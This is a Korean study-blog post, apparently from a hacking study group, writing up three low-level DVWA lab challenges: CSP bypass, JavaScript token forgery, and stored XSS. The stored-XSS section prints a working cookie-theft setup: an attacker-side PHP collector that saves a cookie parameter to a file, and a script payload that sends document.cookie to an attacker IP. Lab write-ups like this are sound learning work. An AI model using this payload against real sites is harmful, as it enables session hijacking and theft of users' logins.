---
layout: default
title: Day35
nav_order: 5

parent: Hacking Project - W5
grand_parent: P4C
---

##### 해당 게시글은 빡공팟 4기(with TeamH4C)와 관련되어 있습니다
-----
여태 과제를 제출 당일까지 한 적이 없었는데 2 일의 공백이 너무 컸다.  
아무리 바쁘더라도 매일 조금씩 하자!

# > DVWA: CSP Bypass

초면입니다만

![image-20220522122141303](../img/image-20220522122141303.png)

<br>

## 삽질

잘 모르기에 통성명부터 해보기로 했다.

Content Security Policy는 웹 페이지 대상으로 공격되는 XSS 등의 기법을 방지하기 위해 도입되었다고 한다. 이전에 CSRF에서 살펴볼 수 있었던 SOP(Same Orgin Policy) 보호 정책과 유사하게 차단하지만, CSP는 웹 페이지 자체에 적용되어 있는 룰이다. 마치 바이너리의 seccomp와 같은 느낌이다. 참조하는 자바스크립트와 같은 코드를 지정한 출처가 맞는지 아닌지 판단하여 공격을 차단한다. 

```php
Content-Security-Policy: script-src 'self' https://apis.google.com
```

이러한 한 줄의 코드로 웹 페이지 내의 코드 및 구글 api 사이트 외의 스크립트는 거부하게 되는 것이다.



```php

<?php

$headerCSP = "Content-Security-Policy: script-src 'self' https://pastebin.com hastebin.com www.toptal.com example.com code.jquery.com https://ssl.google-analytics.com ;"; // allows js from self, pastebin.com, hastebin.com, jquery and google analytics.

header($headerCSP);

# These might work if you can't create your own for some reason
# https://pastebin.com/raw/R570EE00
# https://www.toptal.com/developers/hastebin/raw/cezaruzeka

?>
<?php
if (isset ($_POST['include'])) {
$page[ 'body' ] .= "
    <script src='" . $_POST['include'] . "'></script>
";
}
$page[ 'body' ] .= '
<form name="csp" method="POST">
    <p>You can include scripts from external sources, examine the Content Security Policy and enter a URL to include here:</p>
    <input size="50" type="text" name="include" value="" id="include" />
    <input type="submit" value="Include" />
</form>
';
```

문제의 코드에서도 살펴보면 `$headerCSP`를 이용해 스크립트의 출처를 제한하고 있다.

<br><br>

## Write up

문제에서 제한한 출처는 `'self' https://pastebin.com hastebin.com www.toptal.com example.com code.jquery.com https://ssl.google-analytics.com` 이다. 그리고 문제에서 `https://pastebin.com/raw/R570EE00`주어져있다. 직접 해당 주소로 이동해보면 아래와 같다.

![image-20220522125902844](../img/image-20220522125902844.png)



해당 주소는 허용된 출처이기에 삽입 시 `alert("pastebin");` 이 동작한다.



하지만 내 서버에서 테스트해보니 어째서 인지 불가능하여 `self` 를 이용해 보기로 했다. DVWA 폴더 내부에 `alert("YOU HACKED!!!")`를 작성하여 hack.js로 저장했고 실행했다. 만약 해당 서버에 스크립트만 올려 놓을 수 있다면 응용할 수 있겠다.

![image-20220522125628302](../img/image-20220522125628302.png)



![image-20220522125804471](../img/image-20220522125804471.png)

이 외 출처로 등록된 주소에 스크립트를 올려둘 수만 있다면 스크립트를 이용해 악용할 수 있겠다.

<br><br><br>

------

# > DVWA: JavaScript Attacks

![image-20220522130039306](../img/image-20220522130039306.png)

## 삽질

```php

JavaScript Source
vulnerabilities/javascript/source/low.php
<?php
$page[ 'body' ] .= <<<EOF
<script>

/*
MD5 code from here
https://github.com/blueimp/JavaScript-MD5
*/

!function(n){"use strict";function t(n,t){var r=(65535&n)+(65535&t);return(n>>16)+(t>>16)+(r>>16)<<16|65535&r}function r(n,t){return n<<t|n>>>32-t}function e(n,e,o,u,c,f){return t(r(t(t(e,n),t(u,f)),c),o)}function o(n,t,r,o,u,c,f){return e(t&r|~t&o,n,t,u,c,f)}function u(n,t,r,o,u,c,f){return e(t&o|r&~o,n,t,u,c,f)}function c(n,t,r,o,u,c,f){return e(t^r^o,n,t,u,c,f)}function f(n,t,r,o,u,c,f){return
...
6828^o[r];return e=i(u.concat(d(t)),512+8*t.length),a(i(c.concat(e),640))}function g(n){var t,r,e="";for(r=0;r<n.length;r+=1)t=n.charCodeAt(r),e+="0123456789abcdef".charAt(t>>>4&15)+"0123456789abcdef".charAt(15&t);return e}function v(n){return unescape(encodeURIComponent(n))}function m(n){return h(v(n))}function p(n){return g(m(n))}function s(n,t){return l(v(n),v(t))}function C(n,t){return g(s(n,t))}function A(n,t,r){return t?r?s(t,n):C(t,n):r?m(n):p(n)}"function"==typeof define&&define.amd?define(function(){return A}):"object"==typeof module&&module.exports?module.exports=A:n.md5=A}(this);

    function rot13(inp) {
        return inp.replace(/[a-zA-Z]/g,function(c){return String.fromCharCode((c<="Z"?90:122)>=(c=c.charCodeAt(0)+13)?c:c-26);});
    }

    function generate_token() {
        var phrase = document.getElementById("phrase").value;
        document.getElementById("token").value = md5(rot13(phrase));
    }

    generate_token();
</script>
EOF;
?>
```

이 코드 때문에 `success`를 넣더라도 valid token 이라고 나오는 듯한데 풀이 감이 오질 않아서 확인할 수 있는 부분들은 모두 확인해보기로 했다. 먼저 패킷부터 확인해보았다.

![image-20220522131354624](../img/image-20220522131354624.png)



![image-20220522131453361](../img/image-20220522131453361.png)

어떤 문자를 넣든 동일한 token 값이 전송되었고 "success"를 넣지 않으면 `You got the phrase wrong.`가 출력되었다. 전송되는 저 토큰이 코드에서 생성되는 루틴 임을 알고 있으니 어떻게 하면 성공이 될지 생각을 해봐야 한다. 

<br>

## Write up

token이 만들어지는 순서는 rot13 -> md5 순서이므로 success의 토큰을 만들어보자.

**"success" --( rot13 )--> "fhpprff" --( md5 )--> "38581812b435834ebf84ebcc2c6424d6"**

똑같이 ChangeMe도 진행해보면

**"ChangeMe" --( rot13 )--> "PunatrZr" --( md5 )--> "8b479aefbd90795395b3e7089ae0dc09"**

처음 패킷을 전달했을 때 확인했던 토큰을 또 볼 수 있다. 문제에서 success를 보내면서 Invaild token을 해결해야하므로 패킷 전달 시에 "success"와 "success"의 토큰을 전달해보자.

![image-20220522134248519](../img/image-20220522134248519.png)



![image-20220522134300287](../img/image-20220522134300287.png)

이 문제를 풀기 위해서 드림핵의 툴이 매우 유용했다. [https://tools.dreamhack.games/](https://tools.dreamhack.games/) 너무 잘썼다.

<br><br><br>

-----

# > DVWA: XSS (Stored)

![image-20220522134504535](../img/image-20220522134504535.png)

## 삽질

```php
<?php

if( isset( $_POST[ 'btnSign' ] ) ) {
    // Get input
    $message = trim( $_POST[ 'mtxMessage' ] );
    $name    = trim( $_POST[ 'txtName' ] );

    // Sanitize message input
    $message = stripslashes( $message );
    $message = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

    // Sanitize name input
    $name = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

    // Update database
    $query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

    //mysql_close();
}

?> 
```

따로 입력을 제한하는 코드가 없으며 출력되는 웹 소스에서도 입력한 코드가 그대로 나온다.

<br>

## Write up

이전 문제들에서 XSS를 연습해 볼 수 있었기에 스크립트를 출력하는 어려움은 없다.

![image-20220522134350189](i../mg/image-20220522134350189.png)

다만 기초적인 `alert` 함수와 `document.cookie()`만 알고 있는데 XSS 스크립트를 읽은 사용자의 쿠키값을 얻어내기 위해선 어떻게 해야하는지 간단히 알아보자.


1.공격 준비
```php
<?php
	$cookie = $_GET['cookie'];
	$fp = fopen("./save.txt","w");
	fwrite($fp,$cookie);
	fclose($fp);
?>
```

<br>

2.준비한 XSS 삽입

```php
<script>
	document.location="http://192.168.3.128/attack.php?cookie=" + document.cookie;
</script>
```

![image-20220522135909900](../img/image-20220522135909900.png)

<br>

3.확인

![image-20220522140012556](../img/image-20220522140012556.png)

공격자 서버에 GET 방식으로 인자를 전달 받는 php를 생성하고 XSS에서 document.cookie를 해당 페이지의 인자로 전달했다. 이후 공격자의 서버에 파일을 저장함으로써 피해자의 컴퓨터를 보고 있지 않아도 쿠키 값을 볼 수 있겠다.

<br><br>

이렇게 마지막 low 레벨까지 라업을 쓰는 도중에 6주차 과제도 올라왔다. 이번 주 토요일 sqld 자격증 시험과 다음 bob 지원 마감이기에 시간 관리를 잘해야겠다. 
